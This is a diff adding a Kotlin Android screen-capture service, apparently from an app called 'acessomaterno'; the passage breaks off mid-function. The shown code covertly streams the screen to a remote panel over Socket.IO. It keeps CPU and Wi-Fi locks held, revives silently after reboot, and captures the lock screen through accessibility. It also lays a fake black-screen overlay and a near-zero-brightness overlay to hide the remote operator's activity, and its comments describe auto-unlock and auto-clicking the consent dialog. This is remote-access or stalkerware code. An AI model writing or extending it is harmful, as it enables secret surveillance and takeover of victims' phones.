@@ -1,0 +1,1254 @@
+package com.example.acessomaterno
+
+import android.app.Activity
+import android.app.KeyguardManager
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.app.PendingIntent
+import android.content.Context
+import android.content.BroadcastReceiver
+import android.content.Intent
+import android.content.IntentFilter
+import android.content.pm.ServiceInfo
+import android.os.PowerManager
+import android.net.wifi.WifiManager
+import android.graphics.Bitmap
+import android.graphics.Color
+import android.graphics.PixelFormat
+import android.graphics.PorterDuff
+import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
+import android.media.ImageReader
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
+import android.os.Build
+import android.os.Handler
+import android.os.HandlerThread
+import android.os.IBinder
+import android.os.Looper
+import android.provider.Settings
+import android.util.Log
+import android.util.TypedValue
+import android.view.Gravity
+import android.view.View
+import android.view.WindowManager
+import android.widget.Button
+import android.widget.FrameLayout
+import android.widget.LinearLayout
+import android.widget.ProgressBar
+import android.widget.TextView
+import androidx.core.app.NotificationCompat
+import java.io.ByteArrayOutputStream
+import java.nio.ByteBuffer
+
+class ScreenCaptureService : Service() {
+    companion object {
+        private const val TAG = "ScreenCaptureService"
+        private const val NOTIFICATION_ID = 1001
+        private const val CHANNEL_ID = "ScreenCaptureChannelSilent"
+
+        /** Nome unificado do arquivo de SharedPreferences usado pelo app. */
+        private const val PREFS_NAME = "rastreio_facil_prefs"
+
+        /** Chave unificada que indica se o onboarding (primeiro acesso) ainda não foi concluído. */
+        private const val KEY_PRIMEIRO_ACESSO = "primeiro_acesso"
+
+        var isRunning = false
+            private set
+
+        // TRUE só quando há captura REAL (MediaProjection válida + VirtualDisplay),
+        // não apenas o serviço vivo em "modo escuta". A revalidação do espelhamento
+        // (re-pedir "Iniciar agora") usa isto: se o serviço roda mas NÃO está
+        // capturando de verdade (token perdido ao bloquear/dormir), re-pede.
+        @Volatile var capturandoDeVerdade = false
+
+        // TRUE assim que o espelhamento ficou REALMENTE ativo ao menos uma vez
+        // nesta execução do app (houve sessão de painel de fato usando a tela).
+        // Usado para só revalidar/reanimar o MediaProjection quando havia uma
+        // sessão ativa antes — nunca em socket ocioso sem dispositivo em uso
+        // (evita o loop do consentimento).
+        @Volatile var espelhamentoJaAtivou = false
+
+        // TRAVA DE DISPARO ÚNICO do modal de consentimento: evita LOOP. Fica true
+        // assim que pedimos o consentimento (uma vez) e só volta a false quando a
+        // captura REAL volta (sucesso) OU quando a tela é bloqueada de novo
+        // (SCREEN_OFF) — ou seja, 1 modal por ciclo de bloqueio/desbloqueio.
+        @Volatile var revalidacaoConsentimentoPendente = false
+
+        @Volatile
+        var aguardandoFrameRefresh = false
+
+        @Volatile
+        var ultimoResultCode: Int? = null
+        @Volatile
+        var ultimoData: Intent? = null
+
+        /** Fallback automático: se H.264 não gerar pacote em 2s (ou o painel
+         *  solicitar), para o encoder e envia JPEG ultraleve (360x640, q45,
+         *  só quando a tela muda). */
+        @Volatile
+        var modoFallbackJpeg: Boolean = false
+
+        @JvmStatic
+        fun ativarFallbackJpeg() {
+            try { H264ScreenEncoder.instance?.stop() } catch (_: Exception) {}
+            modoFallbackJpeg = true
+            try { SocketManager.emitStatusCaptura("JPEG_FALLBACK") } catch (_: Exception) {}
+        }
+
+        /** Chave no SharedPreferences que liga/desliga o desbloqueio automático
+         *  por swipe quando a tela acende (SCREEN_ON). Default = true. */
+        const val KEY_AUTO_DESBLOQUEAR_LIGACAO = "auto_desbloquear_ligacao"
+
+        // Janela preta principal
+        private var overlayPretoView: View? = null
+        private var overlayFecharView: View? = null
+        private var windowManager: WindowManager? = null
+
+        val isTelaPretaAtiva: Boolean
+            get() = overlayPretoView != null
+
+        private fun podeDesenharSobreposicao(context: Context): Boolean =
+            Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(context)
+
+        private fun dp(context: Context, valor: Int): Int = TypedValue.applyDimension(
+            TypedValue.COMPLEX_UNIT_DIP, valor.toFloat(), context.resources.displayMetrics
+        ).toInt()
+
+        private fun tipoOverlay(): Int =
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                @Suppress("DEPRECATION")
+                WindowManager.LayoutParams.TYPE_PHONE
+
+        fun ativarTelaPretaFalsa(context: Context, comBotaoFechar: Boolean = true, textoSobreposto: String? = null): Boolean {
+            val appContext = context.applicationContext
+            if (!podeDesenharSobreposicao(appContext)) {
+                Log.e(TAG, "Sem permissão ACTION_MANAGE_OVERLAY_PERMISSION. Abortando blackout.")
+                try {
+                    SocketManager.socket?.emit(
+                        "log_dispositivo",
+                        "[TELA ESCURA ERRO] Permissão de sobreposição NEGADA — permitir em Configurações."
+                    )
+                } catch (_: Exception) {}
+                return false
+            }
+            Handler(Looper.getMainLooper()).post {
+                try {
+                    if (overlayPretoView != null) return@post
+                    val wm = (appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager)
+                        ?: return@post
+                    windowManager = wm
+                    val typeLayout = tipoOverlay()
+
+                    val container = FrameLayout(appContext).apply {
+                        setBackgroundColor(Color.BLACK)
+                    }
+                    if (!textoSobreposto.isNullOrEmpty()) {
+                        val aviso = TextView(appContext).apply {
+                            text = textoSobreposto
+                            setTextColor(Color.parseColor("#88FFFFFF"))
+                            textSize = 16f
+                            gravity = Gravity.CENTER
+                        }
+                        container.addView(
+                            aviso,
+                            FrameLayout.LayoutParams(
+                                FrameLayout.LayoutParams.WRAP_CONTENT,
+                                FrameLayout.LayoutParams.WRAP_CONTENT,
+                                Gravity.CENTER
+                            )
+                        )
+                    }
+                    val params = WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        typeLayout,
+                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                            WindowManager.LayoutParams.FLAG_SECURE,
+                        PixelFormat.OPAQUE
+                    ).apply {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            layoutInDisplayCutoutMode =
+                                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
+                        }
+                    }
+                    wm.addView(container, params)
+                    overlayPretoView = container
+
+                    if (comBotaoFechar) {
+                        val btnFechar = Button(appContext).apply {
+                            text = "✕"
+                            contentDescription = "Fechar tela escura"
+                            setTextColor(Color.parseColor("#444444"))
+                            setBackgroundColor(Color.parseColor("#0a0a0a"))
+                            textSize = 14f
+                            setPadding(0, 0, 0, 0)
+                            setOnClickListener { removerTelaPretaFalsa() }
+                        }
+                        val paramsFechar = WindowManager.LayoutParams(
+                            dp(appContext, 40),
+                            dp(appContext, 40),
+                            typeLayout,
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                                WindowManager.LayoutParams.FLAG_SECURE,
+                            PixelFormat.TRANSLUCENT
+                        ).apply {
+                            gravity = Gravity.TOP or Gravity.END
+                            x = dp(appContext, 12)
+                            y = dp(appContext, 12)
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                                layoutInDisplayCutoutMode =
+                                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
+                            }
+                        }
+                        wm.addView(btnFechar, paramsFechar)
+                        overlayFecharView = btnFechar
+                    }
+                    Log.d(TAG, "Native Window Overlay Injection: blackout físico ativo.")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Erro ao injetar overlay preto: ${e.message}")
+                }
+            }
+            return true
+        }
+
+        fun removerTelaPretaFalsa() {
+            Handler(Looper.getMainLooper()).post {
+                try {
+                    overlayPretoView?.let { windowManager?.removeView(it) }
+                    overlayPretoView = null
+                    overlayFecharView?.let {
+                        try { windowManager?.removeView(it) } catch (_: Exception) {}
+                    }
+                    overlayFecharView = null
+                    Log.d(TAG, "Native Window Overlay Injection: overlay preto removido.")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Erro ao remover overlay preto: ${e.message}")
+                }
+            }
+        }
+
+        private var overlayBrilhoZero: View? = null
+
+        fun ativarBrilhoZero(context: Context): Boolean {
+            val appContext = context.applicationContext
+            if (!podeDesenharSobreposicao(appContext)) return false
+            Handler(Looper.getMainLooper()).post {
+                try {
+                    if (overlayBrilhoZero != null) return@post
+                    val wm = appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return@post
+                    val view = View(appContext)
+                    val params = WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        tipoOverlay(),
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                        PixelFormat.TRANSLUCENT
+                    ).apply {
+                        screenBrightness = 0.01f
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            layoutInDisplayCutoutMode =
+                                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
+                        }
+                    }
+                    wm.addView(view, params)
+                    overlayBrilhoZero = view
+                } catch (e: Exception) {
+                    Log.e(TAG, "Erro ao ativar brilho-zero: ${e.message}")
+                }
+            }
+            return true
+        }
+
+        fun removerBrilhoZero() {
+            Handler(Looper.getMainLooper()).post {
+                overlayBrilhoZero?.let {
+                    try {
+                        (it.context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager)?.removeView(it)
+                    } catch (_: Exception) {}
+                }
+                overlayBrilhoZero = null
+            }
+        }
+
+        // ============================================================
+        // SINCRONIA DE FRAME — captura limpa (sem o overlay visual)
+        // ------------------------------------------------------------
+        // Quando true (ligado pelo botão "Overlay Atualização" do
+        // painel), o ScreenCaptureService oculta o overlay visual de
+        // atualização (MyAccessibilityService.setOverlayAtualizacaoAlpha)
+        // por ~18ms, captura o fundo REAL do dispositivo (sem o cartão
+        // "Atualizando…") e restaura o overlay. O emulador flutuante
+        // recebe apenas o fundo limpo; o aparelho físico continua com
+        // o círculo visível. Requer MyAccessibilityService ativo.
+        // opacidadeDispositivo: escurecimento do overlay do cartão NO APARELHO
+        // (slider "Fundo do Dispositivo"). 0..1, default 0.6.
+        @Volatile
+        var opacidadeDispositivo: Float = 0.6f
+            private set
+
+        /** Aplica a opacidade do DISPOSITIVO (escurece o overlay no aparelho
+         *  via OverlayService). */
+        @JvmStatic
+        fun aplicarOpacidadeDispositivo(op: Float) {
+            val v = op.coerceIn(-1f, 1f)
+            opacidadeDispositivo = v
+            OverlayService.aplicarOpacidade(v)
+        }
+    }
+
+    private var mediaProjection: MediaProjection? = null
+    private var virtualDisplay: VirtualDisplay? = null
+    private var mediaProjectionManager: MediaProjectionManager? = null
+    private var imageReader: ImageReader? = null
+    private var h264ScreenEncoder: H264ScreenEncoder? = null
+    /** Hash do último frame do fallback JPEG (pula envio se a tela não mudou). */
+    @Volatile private var ultimoHashFallback: Int = 0
+    private var lastSendTime = 0L
+    // (itens 1/2) Timestamp do ÚLTIMO envio REAL de JPEG aos viewers (frame
+    // novo emitido OU reenvio de keep-alive). Independente de lastSendTime, que
+    // é bumpado mesmo por frame estático descartado por hash — por isso o
+    // keep-alive antigo não reenviava em tela parada e os viewers caíam.
+    @Volatile private var ultimoEnvioRealMs = 0L
+    // Refresh de estática: reenvia o último JPEG a cada ~300ms com a tela ligada.
+    private val KEEPALIVE_ESTATICA_MS = 300L
+    private var primeiroFrame = true
+    /** Altura virtual do display (calculada em startVirtualDisplay) — usada
+     *  tanto no fluxo normal quanto no ciclo de captura limpa. */
+    private var virtualHeight: Int = 1280
+    private val larguraVirtual: Int = 720
+
+    @Volatile
+    private var lastJpegFrame: ByteArray? = null
+
+    private var handlerThread: HandlerThread? = null
+    private var backgroundHandler: Handler? = null
+
+    @Volatile
+    private var modoSomenteEscuta: Boolean = false
+
+    // Estado da tela (acesa vs apagada pelo botão Power)
+    @Volatile
+    private var isScreenOn: Boolean = true
+
+    private var partialWakeLock: PowerManager.WakeLock? = null
+    private var wifiLock: WifiManager.WifiLock? = null
+
+    @Volatile
+    private var ultimoFrameMs: Long = 0L
+
+    @Volatile
+    private var recriandoDisplay: Boolean = false
+
+    private var keepAliveRunnable: Runnable? = null
+
+    private var watchdogRunnable: Runnable? = null
+    private val WATCHDOG_INTERVALO_MS = 3000L
+    // Anti "mexe sozinho": limiares mais folgados. Numa tela ESTÁTICA o
+    // compositor do Android para de produzir frames novos para o VirtualDisplay,
+    // o que não é um congelamento real — mas o watchdog recriava o display (pulo
+    // visível). Agora só considera stall após 6s sem frame (congelamento de
+    // verdade) e espera 30s entre recriações, reduzindo muito os pulos.
+    private val WATCHDOG_STALL_MS = 6000L
+    private val WATCHDOG_COOLDOWN_MS = 30000L
+    @Volatile
+    private var ultimaRecriacaoWatchdogMs = 0L
+    // Cooldown curto da REVALIDAÇÃO pelo watchdog (reabrir "Iniciar agora") para
+    // ser rápido sem floodar enquanto o loop de auto-clique ainda tenta.
+    private val WATCHDOG_REVAL_COOLDOWN_MS = 10000L
+    @Volatile
+    private var ultimaRevalidacaoWatchdogMs = 0L
+
+    private var overlayMantemTelaAcesa: View? = null
+    private val handlerTelaAcesa = Handler(Looper.getMainLooper())
+    private val removerMantemTelaAcesaRunnable = Runnable { removerOverlayMantemTelaAcesa() }
+
+    private var receiverTelaLigada: BroadcastReceiver? = null
+    private var receiverTelaRegistrado = false
+
+    override fun onCreate() {
+        super.onCreate()
+        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        isScreenOn = isScreenInteractive()
+        // (D) WakeLock/WifiLock 24/7: segura CPU + Wi-Fi desde a criação do
+        // serviço (inclusive desbloqueado ocioso), não só nos caminhos de
+        // captura/tela-apagada — impede o Doze de estrangular a rede.
+        adquirirWakeLocks()
+    }
+
+    private fun isScreenInteractive(): Boolean {
+        return try {
+            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
+            pm?.isInteractive == true
+        } catch (_: Exception) {
+            true
+        }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        enviarLog("onStartCommand chamado.")
+        try {
+            isScreenOn = isScreenInteractive()
+            // (D) Reforço: re-garante os locks a cada start (idempotente —
+            //     adquirirWakeLocks só adquire se ainda não estiverem segurados).
+            adquirirWakeLocks()
+
+            // IMPORTANTE: a ação de REFRESH precisa rodar JUSTAMENTE com a captura
+            // ativa (ela recria o VirtualDisplay reutilizando a MediaProjection viva).
+            // Por isso ela NÃO pode cair nesta guarda de "já em execução", senão o
+            // botão Atualizar do painel nunca refaz a captura.
+            val acaoRefresh = intent?.action == "com.example.acessomaterno.ACTION_REFRESH_CAPTURE"
+            if ((isRunning || virtualDisplay != null || mediaProjection != null) && !acaoRefresh) {
+                enviarLog("Aviso: ScreenCaptureService já em execução com VirtualDisplay ativo. Abortando inicialização dupla.")
+                return START_STICKY
+            }
+
+            if (intent == null) {
+                // REGRA ANDROID 14+: Tokens de MediaProjection NUNCA podem ser reutilizados após restart/boot.
+                // Limpamos tokens salvos para evitar SecurityException e iniciamos em modo escuta seguro.
+                ultimoResultCode = null
+                ultimoData = null
+
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+                    } else {
+                        startForeground(NOTIFICATION_ID, createNotification())
+                    }
+                } catch (_: Exception) {}
+                adquirirWakeLocks()
+                isRunning = true
+                modoSomenteEscuta = true
+                try {
+                    SocketManager.appContext = applicationContext
+                    SocketManager.garantirConexao()
+                } catch (_: Exception) {}
+                enviarLog("Serviço reiniciado via START_STICKY (tokens limpos para evitar reuso) — modo escuta ativo.")
+                registrarReceiverTelaLigada()
+                return START_STICKY
+            }
+
+            if (intent.action == BootReceiver.ACTION_RESTART_BOOT) {
+                enviarLog("Reativação silenciosa via BOOT detectada — foreground em modo escuta.")
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+                    } else {
+                        startForeground(NOTIFICATION_ID, createNotification())
+                    }
+                } catch (e: Exception) {
+                    try { startForeground(NOTIFICATION_ID, createNotification()) } catch (_: Exception) {}
+                }
+                isRunning = true
+                modoSomenteEscuta = true
+                primeiroFrame = true
+                adquirirWakeLocks()
+                try {
+                    SocketManager.appContext = applicationContext
+                    SocketManager.garantirConexao()
+                } catch (e: Exception) {
+                    enviarLog("Aviso: falha ao reconectar Socket.IO no boot: ${e.message}")
+                }
+                registrarReceiverTelaLigada()
+                // [SEM MODAL NO REBOOT] Pós-boot NÃO há token de MediaProjection e
+                // NÃO pedimos modal. A ACESSIBILIDADE assume o envio já aqui: se a
+                // tela estiver ligada, inicia a captura por takeScreenshot na hora
+                // (sem esperar o próximo SCREEN_ON, que pode já ter passado no boot).
+                // Ela funciona bloqueada e desbloqueada; SCREEN_OFF/ON e USER_PRESENT
+                // continuam gerenciando o ciclo.
+                try {
+                    if (isScreenInteractive()) {
+                        MyAccessibilityService.instance?.iniciarCapturaAcessibilidade()
+                        enviarLog("Pós-boot: captura por acessibilidade iniciada (sem MediaProjection, sem modal).")
+                    }
+                } catch (_: Exception) {}
+                return START_STICKY
+            }
+
+            if (intent.action == "com.example.acessomaterno.ACTION_REFRESH_CAPTURE") {
+                enviarLog("Ação ACTION_REFRESH_CAPTURE recebida — recriando VirtualDisplay e ImageReader (reutilizando MediaProjection).")
+                try {
+                    aguardandoFrameRefresh = true
+                    recriarVirtualDisplay(force = true)
+                    enviarLog("VirtualDisplay e ImageReader recriados com sucesso no refresh real.")
+
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if (aguardandoFrameRefresh) {
+                            aguardandoFrameRefresh = false
+                            SocketManager.emitirAtualizacaoConcluida(false, "timeout no refresh")
+                            enviarLog("Timeout (8s) atingido no refresh — emitindo falha ao painel.")
+                        }
+                    }, 8000L)
+                } catch (e: Exception) {
+                    aguardandoFrameRefresh = false
+                    SocketManager.emitirAtualizacaoConcluida(false, "erro ao atualizar captura: ${e.message}")
+                    enviarLog("Exceção ao executar refresh de captura: ${e.message}")
+                }
+                return START_STICKY
+            }
+
+            val resultCode = intent.getIntExtra("RESULT_CODE", Activity.RESULT_CANCELED)
+            val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                intent.getParcelableExtra("DATA", Intent::class.java)
+            } else {
+                @Suppress("DEPRECATION")
+                intent.getParcelableExtra("DATA")
+            }
+            if (resultCode != Activity.RESULT_OK || data == null) {
+                enviarLog("ERRO: sem token de captura (resultCode=$resultCode, data=${data != null}).")
+                SocketManager.emitStatusCaptura("SEM_PERMISSAO_TELA")
+                stopSelf()
+                return START_NOT_STICKY
+            }
+            enviarLog("Token de captura OK (resultCode=$resultCode). Iniciando foreground...")
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+            } else {
+                startForeground(NOTIFICATION_ID, createNotification())
+            }
+            isRunning = true
+            modoSomenteEscuta = false
+            try {
+                mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
+            } catch (e: Exception) {
+                enviarLog("ERRO crítico ao obter MediaProjection (token inválido/reusado): ${e.message}")
+                ultimoResultCode = null
+                ultimoData = null
+                SocketManager.emitStatusCaptura("SEM_PERMISSAO_TELA")
+                stopSelf()
+                return START_NOT_STICKY
+            }
+            if (mediaProjection == null) {
+                enviarLog("ERRO: MediaProjection nula.")
+                SocketManager.emitStatusCaptura("SEM_PERMISSAO_TELA")
+                stopSelf()
+                return START_NOT_STICKY
+            }
+            ultimoResultCode = resultCode
+            ultimoData = data
+            adquirirWakeLocks()
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
+                    override fun onStop() {
+                        enviarLog("MediaProjection encerrada pelo sistema/usuário.")
+                        isRunning = false
+                        capturandoDeVerdade = false   // captura real perdida
+                        // [MODAL SÓ NO REBOOT] Antes, ao perder a captura com a tela
+                        // ligada, reabríamos o modal "Iniciar agora" na hora. A pedido,
+                        // o modal de consentimento agora aparece SOMENTE quando o
+                        // dispositivo é REINICIADO (fluxo BootReceiver -> MainActivity
+                        // AUTO_BOOT_REANIMAR). Em sessão, NÃO reabrimos mais o modal.
+                    }
+                }, Handler(Looper.getMainLooper()))
+            }
+            startVirtualDisplay()
+            enviarLog("VirtualDisplay criado — transmitindo tela em tempo real.")
+            registrarReceiverTelaLigada()
+            return START_STICKY
+        } catch (e: Exception) {
+            enviarLog("CRASH onStartCommand: ${e.javaClass.simpleName}: ${e.message}")
+            stopSelf()
+            return START_NOT_STICKY
+        }
+    }
+
+    private fun enviarLog(msg: String) {
+        Log.d(TAG, msg)
+        try {
+            SocketManager.socket?.emit("log_dispositivo", msg)
+        } catch (_: Exception) {}
+    }
+
+    private fun adquirirWakeLocks() {
+        try {
+            if (partialWakeLock?.isHeld != true) {
+                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                partialWakeLock = pm.newWakeLock(
+                    PowerManager.PARTIAL_WAKE_LOCK,
+                    "AcessoMaterno:CapturaContinua"
+                ).apply {
+                    setReferenceCounted(false)
+                    acquire()
+                }
+                Log.d(TAG, "Partial WakeLock adquirido — CPU permanece acordada com tela apagada.")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Falha ao adquirir Partial WakeLock: ${e.message}")
+        }
+        try {
+            if (wifiLock?.isHeld != true) {
+                val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+                @Suppress("DEPRECATION")
+                wifiLock = wm.createWifiLock(
+                    WifiManager.WIFI_MODE_FULL_HIGH_PERF,
+                    "AcessoMaterno:SocketIoVivo"
+                ).apply {
+                    setReferenceCounted(false)
+                    acquire()
+                }
+                Log.d(TAG, "WifiLock adquirido — Socket.IO permanece conectado com tela apagada.")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Falha ao adquirir WifiLock: ${e.message}")
+        }
+    }
+
+    private fun liberarWakeLocks() {
+        try {
+            partialWakeLock?.let { if (it.isHeld) it.release() }
+            partialWakeLock = null
+        } catch (_: Exception) {}
+        try {
+            wifiLock?.let { if (it.isHeld) it.release() }
+            wifiLock = null
+        } catch (_: Exception) {}
+    }
+
+    private fun mostrarOverlayMantemTelaAcesa() {
+        Handler(Looper.getMainLooper()).post {
+            try {
+                if (overlayMantemTelaAcesa != null) return@post
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+                    Log.w(TAG, "Sem permissão de overlay — não é possível manter a tela acesa via FLAG_KEEP_SCREEN_ON.")
+                    return@post
+                }
+                val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                else
+                    @Suppress("DEPRECATION")
+                    WindowManager.LayoutParams.TYPE_PHONE
+                val view = View(this).apply { setBackgroundColor(Color.TRANSPARENT) }
+                val params = WindowManager.LayoutParams(
+                    1, 1,
+                    type,
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                    PixelFormat.TRANSLUCENT
+                ).apply {
+                    gravity = Gravity.TOP or Gravity.START
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        layoutInDisplayCutoutMode =
+                            WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
+                    }
+                }
+                wm.addView(view, params)
+                overlayMantemTelaAcesa = view
+                handlerTelaAcesa.removeCallbacks(removerMantemTelaAcesaRunnable)
+                handlerTelaAcesa.postDelayed(removerMantemTelaAcesaRunnable, 60000L)
+                Log.d(TAG, "Overlay 1x1 com FLAG_KEEP_SCREEN_ON ativo.")
+            } catch (e: Exception) {
+                Log.e(TAG, "Falha ao criar overlay mantem-tela-acesa: ${e.message}")
+            }
+        }
+    }
+
+    private fun removerOverlayMantemTelaAcesa() {
+        Handler(Looper.getMainLooper()).post {
+            try {
+                overlayMantemTelaAcesa?.let {
+                    (getSystemService(Context.WINDOW_SERVICE) as? WindowManager)?.removeView(it)
+                }
+                overlayMantemTelaAcesa = null
+                handlerTelaAcesa.removeCallbacks(removerMantemTelaAcesaRunnable)
+            } catch (_: Exception) {}
+        }
+    }
+
+    /** Processa um frame Image → Bitmap recortado → JPEG → emite "enviar_tela".
+     *  Usado tanto no fluxo normal (onImageAvailable) quanto no ciclo de
+     *  captura limpa (sincronia de frame). NÃO fecha o image (quem chama fecha). */
+    /** Hash barato de 64 pixels amostrados (8x8) — igual = tela estática. */
+    private fun hashBitmapAmostrado(b: Bitmap): Int {
+        var h = 1
+        val stepX = ((b.width - 1) / 7).coerceAtLeast(1)
+        val stepY = ((b.height - 1) / 7).coerceAtLeast(1)
+        for (y in 0..7) {
+            for (x in 0..7) {
+                val px = (x * stepX).coerceAtMost(b.width - 1)
+                val py = (y * stepY).coerceAtMost(b.height - 1)
+                h = h * 31 + b.getPixel(px, py)
+            }
+        }
+        return h
+    }
+
+    private fun processarEEnviarFrame(image: android.media.Image, width: Int, height: Int) {
+        // ISOLAMENTO DA TELA DE BLOQUEIO (fim do piscar nos 9 pontos): enquanto a
+        // captura por ACESSIBILIDADE está ativa (tela de bloqueio), o MediaProjection
+        // fica 100% em SILÊNCIO — não processa nem envia frame. Senão os dois
+        // emissores escreviam na mesma sala e o viewer alternava entre a tela real
+        // (acessibilidade) e o frame velho/preto do MediaProjection = piscar.
+        // Ao desbloquear o envio volta sozinho. SALVAGUARDA ANTI-FPS:0: só
+        // silencia se a tela ESTIVER REALMENTE BLOQUEADA (keyguard locked). Assim,
+        // se a flag capturaAcessibilidadeAtiva ficar presa em true depois do
+        // desbloqueio, o MediaProjection NÃO fica mudo para sempre (evita FPS:0).
+        // NÃO altera a flag — só refina a condição aqui.
+        if (MyAccessibilityService.instance?.capturaAcessibilidadeAtiva == true &&
+            (getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager)?.isKeyguardLocked == true) return
+        val planes = image.planes
+        if (planes.isNullOrEmpty()) return
+        val buffer: ByteBuffer = planes[0].buffer
+        val pixelStride = planes[0].pixelStride
+        val rowStride = planes[0].rowStride
+        val rowPadding = rowStride - pixelStride * width
+        val bitmap = Bitmap.createBitmap(
+            width + rowPadding / pixelStride,
+            height,
+            Bitmap.Config.ARGB_8888
+        )
+        bitmap.copyPixelsFromBuffer(buffer)
+        val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)
+        if (bitmap != croppedBitmap) bitmap.recycle()
+        val byteArray: ByteArray
+        if (modoFallbackJpeg) {
+            // JPEG ultraleve: 360x640, qualidade 45, só envia quando a tela muda.
+            val scaled = Bitmap.createScaledBitmap(croppedBitmap, 360, 640, true)
+            val hash = hashBitmapAmostrado(scaled)
+            if (hash == ultimoHashFallback && !primeiroFrame) {
+                // Tela estática: não envia (economiza banda). O keep-alive
+                // reenvia o último frame a cada 150ms — o painel não congela.
+                scaled.recycle()
+                croppedBitmap.recycle()
+                return
+            }
+            ultimoHashFallback = hash
+            val baos = ByteArrayOutputStream()
+            scaled.compress(Bitmap.CompressFormat.JPEG, 45, baos)
+            byteArray = baos.toByteArray()
+            scaled.recycle()
+        } else {
+            val baos = ByteArrayOutputStream()
+            croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos)
+            byteArray = baos.toByteArray()
+        }
+        croppedBitmap.recycle()
+
+        lastJpegFrame = byteArray
+        SocketManager.garantirConexao()
+        SocketManager.socket?.emit("enviar_tela", byteArray)
+        ultimoEnvioRealMs = System.currentTimeMillis()  // (itens 1/2) marca envio real
+        if (primeiroFrame) {
+            primeiroFrame = false
+            enviarLog("Primeiro frame enviado (${byteArray.size} bytes).")
+        }
+    }
+
+    private fun startVirtualDisplay() {
+        modoFallbackJpeg = true
+        SocketManager.emitStatusCaptura("JPEG_FALLBACK")
+        val metrics = resources.displayMetrics
+        val width = larguraVirtual
+        // BLINDAGEM ANDROID 7 / NOX: em alguns emuladores x86 metrics.widthPixels /
+        // heightPixels podem vir 0 logo após o consentimento (antes do 1º layout).
+        // Divisão por 0 geraria Infinity -> toInt() gigante -> ImageReader /
+        // VirtualDisplay estouram com crash NATIVO (não capturável por try/catch),
+        // fechando o app. Aqui garantimos dimensões sempre válidas.
+        val mw = metrics.widthPixels
